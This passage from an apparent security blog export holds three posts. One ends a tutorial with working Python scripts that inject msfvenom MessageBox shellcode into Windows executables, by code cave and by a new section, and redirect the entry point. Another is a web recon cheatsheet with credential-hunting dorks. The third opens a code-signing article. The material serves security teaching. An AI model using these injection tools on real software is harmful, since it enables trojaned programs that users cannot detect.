MESSAGEBOX_SHELLCODE += b\"\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\" MESSAGEBOX_SHELLCODE += b\"\\x88\\x41\\x58\\x41\\x58\\x5e\\x59\\x48\\x01\\xd0\\x5a\\x41\" MESSAGEBOX_SHELLCODE += b\"\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\" MESSAGEBOX_SHELLCODE += b\"\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\" MESSAGEBOX_SHELLCODE += b\"\\xff\\x5d\\xe8\\x0b\\x00\\x00\\x00\\x75\\x73\\x65\\x72\\x33\" MESSAGEBOX_SHELLCODE += b\"\\x32\\x2e\\x64\\x6c\\x6c\\x00\\x59\\x41\\xba\\x4c\\x77\\x26\" MESSAGEBOX_SHELLCODE += b\"\\x07\\xff\\xd5\\x49\\xc7\\xc1\\x40\\x00\\x00\\x00\\xe8\\x0f\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x00\\x00\\x43\\x6f\\x64\\x65\\x20\\x49\\x6e\\x6a\\x65\" MESSAGEBOX_SHELLCODE += b\"\\x63\\x74\\x65\\x64\\x21\\x00\\x5a\\xe8\\x08\\x00\\x00\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x61\\x63\\x6b\\x65\\x64\\x21\\x00\\x41\\x58\\x48\\x31\" MESSAGEBOX_SHELLCODE += b\"\\xc9\\x41\\xba\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\" def inject_messagebox(input_file, output_file, cave_rva, cave_raw, cave_size): \"\"\"Inject MessageBox shellcode into code cave\"\"\" pe = pefile.PE(input_file) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== MessageBox Injection ==={Colors.END}\\n\") original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint print(f\"{Colors.BOLD}[1] Target Information:{Colors.END}\") print(f\" Original entry: {Colors.GREEN}0x{original_entry:X}{Colors.END}\") print(f\" Code cave: {Colors.CYAN}0x{cave_rva:X}{Colors.END}\") print(f\" Cave size: {Colors.YELLOW}{cave_size}{Colors.END} bytes\\n\") # Build complete shellcode shellcode = bytearray(MESSAGEBOX_SHELLCODE) print(f\"{Colors.BOLD}[2]{Colors.END} MessageBox shellcode: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes\") print(f\" {Colors.BLUE}This code will show a popup window{Colors.END}\\n\") # Add JMP back to original entry jmp_offset = original_entry - (cave_rva + len(shellcode) + 5) shellcode += b'\\xE9' shellcode += struct.pack('&lt;i', jmp_offset) print(f\"{Colors.BOLD}[3]{Colors.END} Adding JMP to return to original code\") print(f\" Total size: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes\\n\") # Check if it fits if len(shellcode) &gt; cave_size: print(f\"{Colors.RED}{Colors.BOLD}[ERROR]{Colors.END} Shellcode ({Colors.YELLOW}{len(shellcode)}{Colors.END} bytes) &gt; Cave ({Colors.YELLOW}{cave_size}{Colors.END} bytes)\") print(f\" Need {Colors.RED}{len(shellcode) - cave_size}{Colors.END} more bytes!\") return False print(f\"{Colors.GREEN}{Colors.BOLD}[4] Size check: OK!{Colors.END}\") print(f\" Shellcode: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes\") print(f\" Cave: {Colors.YELLOW}{cave_size}{Colors.END} bytes\") print(f\" Remaining: {Colors.GREEN}{cave_size - len(shellcode)}{Colors.END} bytes\\n\") # Write shellcode print(f\"{Colors.BOLD}[5]{Colors.END} Writing shellcode to offset {Colors.CYAN}0x{cave_raw:X}{Colors.END}\") pe.set_bytes_at_offset(cave_raw, bytes(shellcode)) print(f\" {Colors.GREEN}Written successfully!{Colors.END}\\n\") # Change entry point print(f\"{Colors.BOLD}[6]{Colors.END} Changing entry point:\") print(f\" {Colors.RED}{hex(original_entry)}{Colors.END} → {Colors.GREEN}{hex(cave_rva)}{Colors.END}\\n\") pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_rva # Save pe.write(output_file) pe.close() print(f\"{Colors.BOLD}{Colors.GREEN}[Success]{Colors.END} Saved as: {Colors.YELLOW}{output_file}{Colors.END}\") print(f\"\\n{Colors.BOLD}Expected behavior:{Colors.END}\") print(f\" 1. Program starts\") print(f\" 2. {Colors.CYAN}MessageBox appears: 'Hacked!'{Colors.END}\") print(f\" 3. User closes MessageBox\") print(f\" 4. Calculator runs normally\") print(f\"\\n{Colors.BOLD}{Colors.GREEN}This demonstrates code injection!{Colors.END}\\n\") return True if __name__ == \"__main__\": if len(sys.argv) != 6: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;input&gt; &lt;output&gt; &lt;cave_rva&gt; &lt;cave_raw&gt; &lt;cave_size&gt;{Colors.END}\") print(f\"\\n{Colors.YELLOW}Example:{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe Calc_hacked.exe 0x2299 0x1699 359{Colors.END}\") sys.exit(1) inject_messagebox( sys.argv[1], sys.argv[2], int(sys.argv[3], 16), int(sys.argv[4], 16), int(sys.argv[5]) ) Running the injection: python3 inject_messagebox.py Calculator.exe Calculator_hacked.exe 0x2239 0x1639 455 === MessageBox Injection === [1] Target Information: Original entry: 0x18C0 Code cave: 0x2239 Cave size: 455 bytes [2] MessageBox shellcode: 300 bytes This code will show a popup window [3] Adding JMP to return to original code Total size: 305 bytes [4] Size check: OK! Shellcode: 305 bytes Cave: 455 bytes Remaining: 150 bytes [5] Writing shellcode to offset 0x1639 Written successfully! [6] Changing entry point: 0x18c0 → 0x2239 [Success] Saved as: Calculator_hacked.exe Expected behavior: 1. Program starts 2. MessageBox appears: 'Hacked!' 3. User closes MessageBox 4. Calculator runs normally This demonstrates code injection! Testing the injection: PS &gt; Calculator_hacked.exe A MessageBox appears before the Calculator starts Success! The malicious code executed, showed a popup, then the program continued normally. A user might not even realize their program was modified. What just happened: User runs Calculator_hacked.exe Entry point redirected to our code cave (0x2299) MessageBox shellcode executes Popup appears: “Hacked!” User closes popup JMP returns to original entry point (0x1920) Calculator runs normally This is a perfect demonstration of why code signing matters. Without signatures: Attackers can modify programs freely Users have no way to detect tampering Malicious code runs invisibly Demonstration: Section Addition Method Code cave injection works for small payloads, but what if we need more space? The solution is adding a new executable section to the PE file. Think of it like adding a new chapter to our cookbook: Original Cookbook: ├── Chapter 1: Recipes (.text) ├── Chapter 2: Ingredients (.rdata) └── Chapter 3: Photos (.data) Modified Cookbook: ├── Chapter 1: Recipes (.text) ├── Chapter 2: Ingredients (.rdata) ├── Chapter 3: Photos (.data) └── Chapter 4: Secret Recipes (.inject) ← NEW! Our malicious code When we add a section, we need to: Update PE headers - Tell Windows there’s a new section Create section header - Metadata describing our new section (40 bytes) Append section data - The actual space for our code (can be MB in size) Mark as executable - Set the right permissions (EXECUTE + READ + WRITE) Visual representation: BEFORE (original file): ┌──────────┬────────┬─────────┬───────┬─────┐ │ Headers │ .text │ .rdata │ .data │ EOF │ └──────────┴────────┴─────────┴───────┴─────┘ Code Strings Variables AFTER (with new section): ┌──────────┬────────┬─────────┬───────┬─────────┬─────┐ │ Headers │ .text │ .rdata │ .data │ .inject │ EOF │ │ (+1 sec) │ │ │ │ (NEW) │ │ └──────────┴────────┴─────────┴───────┴─────────┴─────┘ ^ Our code here (4096 bytes) Section Header Structure: A section header is exactly 40 bytes with this structure: Offset Size Field ------ ---- ----- 0 8 Name (e.g., \".inject\\0\\0\") 8 4 VirtualSize (size in memory) 12 4 VirtualAddress (where it loads in memory) 16 4 SizeOfRawData (size in file) 20 4 PointerToRawData (file offset) 24 4 PointerToRelocations (usually 0) 28 4 PointerToLinenumbers (usually 0) 32 2 NumberOfRelocations (usually 0) 34 2 NumberOfLinenumbers (usually 0) 36 4 Characteristics (permissions flags) Key fields: Name: .inject (our section name) VirtualAddress: Where it appears in memory (must be aligned) PointerToRawData: Where it is in the file on disk Characteristics: 0xE0000020 = EXECUTE + READ + WRITE Reference: Microsoft PE Format - Section Table Creating New Section import pefile import struct import sys class Colors: HEADER = '\\033[95m' BLUE = '\\033[94m' CYAN = '\\033[96m' GREEN = '\\033[92m' YELLOW = '\\033[93m' RED = '\\033[91m' BOLD = '\\033[1m' END = '\\033[0m' def add_section(input_file, output_file, section_size=0x1000): \"\"\"Add new executable section to PE file\"\"\" pe = pefile.PE(input_file) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== Adding New Section ==={Colors.END}\\n\") print(f\"{Colors.BOLD}[1] Configuration:{Colors.END}\") print(f\" Name: {Colors.YELLOW}.inject{Colors.END}\") print(f\" Size: {Colors.GREEN}{section_size}{Colors.END} bytes ({Colors.GREEN}{section_size//1024}KB{Colors.END})\\n\") # Get last section and alignment info last_section = pe.sections[-1] section_alignment = pe.OPTIONAL_HEADER.SectionAlignment file_alignment = pe.OPTIONAL_HEADER.FileAlignment print(f\"{Colors.BOLD}[2] Alignment:{Colors.END}\") print(f\" Section: {Colors.CYAN}0x{section_alignment:X}{Colors.END}\") print(f\" File: {Colors.CYAN}0x{file_alignment:X}{Colors.END}\\n\") # Calculate addresses new_section_rva = (last_section.VirtualAddress + last_section.Misc_VirtualSize) new_section_rva = (new_section_rva + section_alignment - 1) &amp; ~(section_alignment - 1) new_raw_offset = (last_section.PointerToRawData + last_section.SizeOfRawData) new_raw_size = (section_size + file_alignment - 1) &amp; ~(file_alignment - 1) print(f\"{Colors.BOLD}[3] Addresses:{Colors.END}\") print(f\" RVA: {Colors.GREEN}0x{new_section_rva:X}{Colors.END}\") print(f\" Raw: {Colors.GREEN}0x{new_raw_offset:X}{Colors.END}\\n\") # Create section header (40 bytes) section_header = bytearray(40) struct.pack_into('8s', section_header, 0, b'.inject\\x00') struct.pack_into('I', section_header, 8, section_size) struct.pack_into('I', section_header, 12, new_section_rva) struct.pack_into('I', section_header, 16, new_raw_size) struct.pack_into('I', section_header, 20, new_raw_offset) struct.pack_into('I', section_header, 24, 0) struct.pack_into('I', section_header, 28, 0) struct.pack_into('H', section_header, 32, 0) struct.pack_into('H', section_header, 34, 0) struct.pack_into('I', section_header, 36, 0xE0000020) print(f\"{Colors.BOLD}[4] Characteristics:{Colors.END} {Colors.GREEN}0xE0000020{Colors.END}\") print(f\" EXECUTE + READ + WRITE + CODE\\n\") # Calculate section table offset section_table_offset = ( pe.DOS_HEADER.e_lfanew + 4 + pe.FILE_HEADER.sizeof() + pe.FILE_HEADER.SizeOfOptionalHeader ) new_section_header_offset = section_table_offset + (len(pe.sections) * 40) # Update headers pe.FILE_HEADER.NumberOfSections += 1 pe.OPTIONAL_HEADER.SizeOfImage = new_section_rva + section_size print(f\"{Colors.BOLD}[5] Headers Updated:{Colors.END}\") print(f\" Sections: {Colors.YELLOW}{pe.FILE_HEADER.NumberOfSections}{Colors.END}\") print(f\" Image Size: {Colors.GREEN}0x{pe.OPTIONAL_HEADER.SizeOfImage:X}{Colors.END}\\n\") # Write pe.write(output_file) with open(output_file, 'r+b') as f: f.seek(new_section_header_offset) f.write(bytes(section_header)) f.seek(0, 2) f.write(b'\\x00' * new_raw_size) pe.close() print(f\"{Colors.GREEN}{Colors.BOLD}[Success]{Colors.END} {Colors.YELLOW}{output_file}{Colors.END}\") print(f\"{Colors.BOLD}Section RVA:{Colors.END} {Colors.CYAN}0x{new_section_rva:X}{Colors.END}\\n\") return new_section_rva if __name__ == \"__main__\": if len(sys.argv) &lt; 3: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;input.exe&gt; &lt;output.exe&gt; [size]{Colors.END}\") print(f\"\\n{Colors.YELLOW}Examples:{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe Calc_section.exe{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calculator.exe Calc_section.exe 8192{Colors.END}\") sys.exit(1) add_section(sys.argv[1], sys.argv[2], int(sys.argv[3]) if len(sys.argv) &gt; 3 else 0x1000) Running the script: python3 add_section.py Calculator.exe Calculator_section.exe === Adding New Section === [1] Configuration: Name: .inject Size: 4096 bytes (4KB) [2] Alignment: Section: 0x1000 File: 0x200 [3] Addresses: RVA: 0x9000 Raw: 0x3400 [4] Characteristics: 0xE0000020 EXECUTE + READ + WRITE + CODE [5] Headers Updated: Sections: 7 Image Size: 0xA000 [Success] Calculator_section.exe Section RVA: 0x9000 Verify with analyze_pe.py: python3 analyze_pe.py Calculator_section.exe === Analyzing: Calculator_section.exe === [1] Entry Point: 0x18C0 This is where the program starts executing Like the cookbook saying 'start reading at page 5' [2] Sections (Chapters): Total sections: 7 .text at address 0x1000, size 5120 bytes ^ This section contains EXECUTABLE CODE The CPU will run instructions from here .rdata at address 0x3000, size 5120 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .data at address 0x5000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .pdata at address 0x6000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .rsrc at address 0x7000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .reloc at address 0x8000, size 512 bytes ^ This section contains DATA (not code) Stores strings, numbers, or other information .inject at address 0x9000, size 4096 bytes ^ This section contains EXECUTABLE CODE The CPU will run instructions from here Perfect! New section created and marked as executable. Injecting into Section import pefile import struct import sys class Colors: HEADER = '\\033[95m' BLUE = '\\033[94m' CYAN = '\\033[96m' GREEN = '\\033[92m' YELLOW = '\\033[93m' RED = '\\033[91m' BOLD = '\\033[1m' END = '\\033[0m' # MessageBox shellcode from msfvenom (302 bytes, ExitProcess removed) MESSAGEBOX_SHELLCODE = b\"\" MESSAGEBOX_SHELLCODE += b\"\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xcc\\x00\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x41\\x51\\x41\\x50\\x52\\x48\\x31\\xd2\\x65\\x48\\x8b\" MESSAGEBOX_SHELLCODE += b\"\\x52\\x60\\x51\\x48\\x8b\\x52\\x18\\x56\\x48\\x8b\\x52\\x20\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\" MESSAGEBOX_SHELLCODE += b\"\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x48\\x8b\\x52\\x20\" MESSAGEBOX_SHELLCODE += b\"\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\" MESSAGEBOX_SHELLCODE += b\"\\x41\\x51\\x0f\\x85\\x72\\x00\\x00\\x00\\x8b\\x80\\x88\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x8b\\x48\" MESSAGEBOX_SHELLCODE += b\"\\x18\\x50\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\" MESSAGEBOX_SHELLCODE += b\"\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\" MESSAGEBOX_SHELLCODE += b\"\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\" MESSAGEBOX_SHELLCODE += b\"\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\" MESSAGEBOX_SHELLCODE += b\"\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\" MESSAGEBOX_SHELLCODE += b\"\\x88\\x41\\x58\\x41\\x58\\x5e\\x59\\x48\\x01\\xd0\\x5a\\x41\" MESSAGEBOX_SHELLCODE += b\"\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\" MESSAGEBOX_SHELLCODE += b\"\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4b\\xff\\xff\" MESSAGEBOX_SHELLCODE += b\"\\xff\\x5d\\xe8\\x0b\\x00\\x00\\x00\\x75\\x73\\x65\\x72\\x33\" MESSAGEBOX_SHELLCODE += b\"\\x32\\x2e\\x64\\x6c\\x6c\\x00\\x59\\x41\\xba\\x4c\\x77\\x26\" MESSAGEBOX_SHELLCODE += b\"\\x07\\xff\\xd5\\x49\\xc7\\xc1\\x40\\x00\\x00\\x00\\xe8\\x0f\" MESSAGEBOX_SHELLCODE += b\"\\x00\\x00\\x00\\x43\\x6f\\x64\\x65\\x20\\x49\\x6e\\x6a\\x65\" MESSAGEBOX_SHELLCODE += b\"\\x63\\x74\\x65\\x64\\x21\\x00\\x5a\\xe8\\x08\\x00\\x00\\x00\" MESSAGEBOX_SHELLCODE += b\"\\x48\\x61\\x63\\x6b\\x65\\x64\\x21\\x00\\x41\\x58\\x48\\x31\" MESSAGEBOX_SHELLCODE += b\"\\xc9\\x41\\xba\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\" def inject_section(input_file, output_file, section_rva): \"\"\"Inject shellcode into new section\"\"\" pe = pefile.PE(input_file) print(f\"\\n{Colors.BOLD}{Colors.CYAN}=== Section Injection ==={Colors.END}\\n\") original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint print(f\"{Colors.BOLD}[1] Target:{Colors.END}\") print(f\" Original entry: {Colors.GREEN}0x{original_entry:X}{Colors.END}\") print(f\" Section RVA: {Colors.CYAN}0x{section_rva:X}{Colors.END}\\n\") # Build shellcode shellcode = bytearray(MESSAGEBOX_SHELLCODE) print(f\"{Colors.BOLD}[2] Shellcode:{Colors.END} {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes\\n\") # Calculate JMP jmp_from = section_rva + len(shellcode) + 5 jmp_offset = original_entry - jmp_from print(f\"{Colors.BOLD}[3] JMP:{Colors.END}\") print(f\" From: {Colors.CYAN}0x{jmp_from:X}{Colors.END}\") print(f\" To: {Colors.GREEN}0x{original_entry:X}{Colors.END}\\n\") # Add JMP shellcode += b'\\xE9' shellcode += struct.pack('&lt;i', jmp_offset) print(f\"{Colors.BOLD}[4] Total:{Colors.END} {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes\\n\") # Write for section in pe.sections: if section.VirtualAddress == section_rva: print(f\"{Colors.BOLD}[5] Writing to:{Colors.END} {Colors.CYAN}{section.Name.decode().strip(chr(0))}{Colors.END}\") pe.set_bytes_at_offset(section.PointerToRawData, bytes(shellcode)) print(f\" {Colors.GREEN}✓ Done!{Colors.END}\\n\") break # Redirect entry print(f\"{Colors.BOLD}[6] Entry:{Colors.END} {Colors.RED}0x{original_entry:X}{Colors.END} → {Colors.GREEN}0x{section_rva:X}{Colors.END}\\n\") pe.OPTIONAL_HEADER.AddressOfEntryPoint = section_rva pe.write(output_file) pe.close() print(f\"{Colors.GREEN}{Colors.BOLD}[Success]{Colors.END} {Colors.YELLOW}{output_file}{Colors.END}\\n\") if __name__ == \"__main__\": if len(sys.argv) != 4: print(f\"{Colors.RED}Usage: {sys.argv[0]} &lt;input&gt; &lt;output&gt; &lt;section_rva&gt;{Colors.END}\") print(f\"\\n{Colors.YELLOW}Example:{Colors.END}\") print(f\" {Colors.CYAN}python {sys.argv[0]} Calc_section.exe Calc_final.exe 0x9000{Colors.END}\") sys.exit(1) inject_section(sys.argv[1], sys.argv[2], int(sys.argv[3], 16)) Running the script: python3 inject_section.py Calculator_section.exe Calculator_final.exe 0x9000 === Section Injection === [1] Target: Original entry: 0x18C0 Section RVA: 0x9000 [2] Shellcode: 300 bytes [3] JMP: From: 0x9131 To: 0x18C0 [4] Total: 305 bytes [5] Writing to: .inject ✓ Done! [6] Entry: 0x18C0 → 0x9000 [Success] Calculator_final.exe Testing: PS &gt; Calculator_final.exe MessageBox appears, then Calculator runs normally Success! Section addition method works perfectly. Code Cave vs Section Addition Aspect Code Cave Section Addition Stealth Higher (existing space) Lower (new section) Size Limit Limited (&lt;1KB usually) Flexible (KB to MB) Complexity Find suitable cave Create structure Detection Harder to spot Easier (unusual names) Reliability Depends on caves Always works Use Case Small payloads Large payloads Real-world usage: Code caves: Small payloads, initial loaders Section addition: Large payloads, main malware components Conclusion We demonstrated binary injection using code cave and section addition methods. Both techniques successfully inject malicious code into executables while maintaining original functionality. These techniques are essential for security professionals to understand offensive capabilities and defensive detection. During assessments, verify executable integrity and look for indicators of modification such as unusual sections or suspicious entry points." }, { "title": "Web Reconnaissance & Enumeration Cheatsheet", "url": "/posts/web-recon-enum-cheatsheet/", "categories": "Web App Security, WebApp Techniques", "tags": "reconnaissance, enumeration, technology-detection, osint", "date": "2026-01-05 09:05:00 +0700", "content": "Introduction Reconnaissance and enumeration are the foundation of web application pentesting. Without thorough recon, we miss targets, waste time on irrelevant paths, and fail to map the complete attack surface. This cheatsheet covers essential techniques and tools for web reconnaissance and enumeration. Important: This cheatsheet provides baseline actions - manual analysis and verification are essential Tool versions may affect command syntax and output format - adjust accordingly Reconnaissance is not a one-size-fits-all process - adapt techniques to your specific target Think outside the box when standard methods fail This article is under active development and will be continuously updated Project Setup # Create project structure mkdir -p 2026/target.com &amp;&amp; cd 2026/target.com mkdir subdomains ports dirs ssl Root Domain Discovery cd subdomains # Find ASN by organization name amass intel -org \"Organization Name\" -o asn.txt # Alternative: https://bgp.he.net/ (manual, faster) # Find domains by ASN amass intel -asn \"AS12345\" -o asn-subnet.txt # Alternative: https://ipinfo.io/AS12345 (requires login) # Find ASN from domain dig +short target.com curl https://ipinfo.io/{ip}/json # WHOIS lookup whois target.com # Historical WHOIS: https://whois-history.whoisxmlapi.com/ Subdomain Enumeration domain='target.com' # OSINT discovery - subfinder subfinder -d \"$domain\" -o domain-ip-subfinder.txt -active -ip awk -F\",\" '{print $1}' domain-ip-subfinder.txt &gt; domain-subfinder.txt awk -F\",\" '{print $2}' domain-ip-subfinder.txt &gt; ip-subfinder.txt # OSINT discovery - amass amass enum -d \"$domain\" -active -oA domain-ip-amass sed 's/\\x1B\\[[0-9;]*[mK]//g' domain-ip-amass.txt | grep -Eo \"([a-zA-Z0-9_-]+\\.)+${domain}\" | sort -u &gt; domain-amass.txt grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' domain-ip-amass.txt | sort -u &gt; ip-amass.txt # Brute-force discovery gobuster dns --domain \"$domain\" \\ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\ -o domain-ip-brute.txt --resolver 1.1.1.1 --delay 100ms --timeout 5s sed 's/\\x1B\\[[0-9;]*[mK]//g' domain-ip-brute.txt | awk '{print $1}' | sort -u &gt; domain-brute.txt # Merge results cat domain-amass.txt domain-brute.txt domain-subfinder.txt | sort -u &gt; all-subdomains.txt cat ip-amass.txt ip-brute.txt ip-subfinder.txt | sort -u &gt; all-ip.txt # Generate permutations dnsgen all-subdomains.txt &gt; permutations-temp.txt cat all-subdomains.txt permutations-temp.txt | sort -u &gt; permutations.txt rm permutations-temp.txt # Validate with DNS dnsx -l permutations.txt -o valid-subdomains.txt -stats -silent -r 1.1.1.1 echo \"$domain\" &gt;&gt; valid-subdomains.txt Port Scanning cd ../ports # Passive scanning (Shodan via nrich) cat ../subdomains/all-ip.txt | xargs -I{} -n1 sh -c 'echo {} | nrich -; sleep 2' &gt; shodan-ips.txt # Active scanning - naabu naabu -l ../subdomains/all-ip.txt -top-ports 100 -o naabu-ips.txt # Active scanning - nmap nmap -p- -oN {target}-allports.nmap {target} -vv nmap -sV -sC --script vuln -p{ports} -oN {target}.nmap {target} -vv Live Host Discovery # Probe subdomains cat ../subdomains/valid-subdomains.txt | httpx -o http.txt -title -status-code -tech-detect # Probe IPs cat ../subdomains/all-ip.txt | httpx -o http-ip.txt -title -status-code -tech-detect # Merge and screenshot cat http-ip.txt http.txt | sort -u &gt; http-all.txt awk '{print $1}' http-all.txt &gt; http-all-clean.txt gowitness scan file -f http-all-clean.txt WAF Detection cd ../dirs wafw00f https://target.com/ | tee waf.txt Finding origin IP behind WAF: Check DNS history: SecurityTrails Compare screenshots from Live Host Discovery Virtual host enumeration with ffuf + gowitness If found, test access: # Replace 203.0.113.50 with actual origin IP echo \"203.0.113.50 target.com\" | sudo tee -a /etc/hosts curl -i http://target.com Content Discovery # Passive discovery echo \"https://target.com\" | gau &gt; gau.txt echo \"https://target.com\" | waybackurls &gt; waybackurls.txt cat gau.txt waybackurls.txt | sort -u &gt; osint-url.txt # Active discovery - dirsearch dirsearch -u \"https://target.com/\" -o dirsearch.txt dirsearch -r -u \"https://target.com/\" -o dirsearch-recursive.txt # Active discovery - gobuster gobuster dir -u https://target.com/ -w /usr/share/dirb/wordlists/common.txt -o gobuster-common.txt gobuster dir -u https://target.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o gobuster-raftdir.txt # Crawling - katana katana -d 4 -jc -u https://target.com -o katana.txt # Extract parameters cat osint-url.txt | grep \"=\" grep -oP '(?&lt;=\\?).*' osint-url.txt | tr '&amp;' '\\n' | cut -d= -f1 | sort -u &gt; parameters.txt # Parameter discovery paramspider -d target.com arjun -u https://target.com Browser Extensions Browser extensions can assist with reconnaissance directly from your browser while browsing the target application. Technology Detection: Wappalyzer - Identifies web technologies, frameworks, CMS, and server software Endpoint Discovery: Endpoint Extractor - Extracts API endpoints and paths from web pages Credential Leak Detection: TruffleHog Chrome Extension - Scans for exposed secrets and credentials in web content These extensions complement automated tools by providing real-time analysis during manual browsing. SSL/TLS Analysis cd ../ssl nmap --script \"ssl*\" -p443 -oN ssl.nmap target.com testssl.sh target.com | tee testssl.txt OSINT GitHub \"target.com\" \"target.com\" password \"target.com\" api_key \"target.com\" secret \"target.com\" path:**/.env \"target.com\" path:**/config \"target.com\" language:python password Shodan hostname:\"target.com\" ssl.cert.subject.cn:\"target.com\" http.title:\"target.com\" org:\"Organization Name\" net:\"203.0.113.0/24\" Google Dorking site:target.com site:*.target.com # Login pages site:target.com inurl:login site:target.com inurl:admin site:target.com intitle:admin # Sensitive files site:target.com filetype:pdf site:target.com filetype:sql site:target.com filetype:log site:target.com filetype:env site:target.com filetype:config # Sensitive directories site:target.com inurl:backup site:target.com inurl:api site:target.com inurl:test site:target.com inurl:dev # Credentials site:target.com intext:password site:target.com intext:username # Error messages site:target.com intext:\"sql syntax\" site:target.com intext:\"stack trace\" # Technology info site:target.com inurl:phpinfo site:target.com intext:\"powered by\" Bing site:target.com site:target.com filetype:pdf site:target.com instreamset:(url title):login Wayback Machine https://web.archive.org/web/*/target.com https://web.archive.org/web/*/subdomain.target.com Censys \"target.com\" host.services.dns.names: \"target.com\" host.services.http.response.html_title: \"App Name\" host.services.port = 443 and host.services.dns.names: \"target.com\" host.services.software.product: \"nginx\" Pastebin site:pastebin.com \"target.com\" site:ghostbin.com \"target.com\" Social Media \"target.com\" site:x.com \"target.com\" site:reddit.com Conclusion This cheatsheet covers essential reconnaissance techniques for web applications. Always combine automated tools with manual analysis for comprehensive results. Reconnaissance is not a one-size-fits-all process - adapt techniques based on target context and be creative in your approach. Think outside the box when standard methods don’t yield results. This article is still under development and will be updated with new techniques and tools." }, { "title": "Code Signing in Windows Applications", "url": "/posts/code-signing-in-windows-app/", "categories": "Windows App Security, WinApp Techniques", "tags": "enumeration, code-signing, certificate-analysis, windows", "date": "2026-01-04 21:46:00 +0700", "content": "Introduction Code signing is a security mechanism that uses digital signatures to verify the authenticity and integrity of executables. When an application is signed, any modification to the binary invalidates the signature. This article covers how to verify code signatures and demonstrates why signature validation matters in application security. Why Code Signing Matters Code signing serves two main purposes: Authenticity - Confirms the application comes from a verified publisher Integrity - Detects any tampering or modification to the executable Without proper code signing, attackers can: Modify legitimate applications without detection Distribute trojaned versions of software Bypass application whitelisting based on signatures Impersonate trusted software vendors During security assessments, unsigned applications or those using self-signed certificates in production environments should be reported as security findings. According to OWASP Desktop App Security Top 10, lack of proper code signing falls under DA8 - Poor Code Quality. File Types That Support Code Signing Code signing is not limited to executables. Various Windows file types can be digitally signed: .exe - Executable files .dll - Dynamic-link libraries .sys - System drivers .msi - Windows Installer packages .cab - Cabinet archive files .ocx - ActiveX controls .ps1 - PowerShell scripts and more This article demonstrates code signing using .exe files, but the same principles apply to other file types. Demonstration: Signature Verification We’ll demonstrate how code signing works and how it detects tampering. Step 1: Create Unsigned Application Create a simple C++ application: #include int main() { std::cout &lt;&lt; \"Hello World!\\n\"; } Build it as x64 Release in Visual Studio. Visual Studio code The executable will be at x64\\Release\\HelloWorld.exe. Step 2: Verify Signature Status Using Windows Properties: Right-click the executable → Properties → Digital Signatures tab Unsigned application - Digital Signatures tab is empty Using sigcheck: Use sigcheck from Sysinternals: PS &gt; .\\HelloWorld.exe Hello World! PS &gt; sigcheck .\\HelloWorld.exe Sigcheck v2.90 - File version and signature viewer Copyright (C) 2004-2022 Mark Russinovich Sysinternals - www.sysinternals.com C:\\path\\to\\HelloWorld.exe: Verified: Unsigned Link date: 07:56 04/01/2026 Publisher: n/a Company: n/a Description: n/a Product: n/a Prod version: n/a File version: n/a MachineType: 64-bit Result: The application is Unsigned - anyone can modify it without detection. Step 3: Create Self-Signed Certificate For testing, we’ll create a self-signed certificate. Production environments should use trusted Certificate Authorities like DigiCert, Sectigo, or GlobalSign. # Create certificate $cert = New-SelfSignedCertificate ` -Subject \"CN=Lab Code Signing Certificate\" ` -Type CodeSigningCert ` -CertStoreLocation 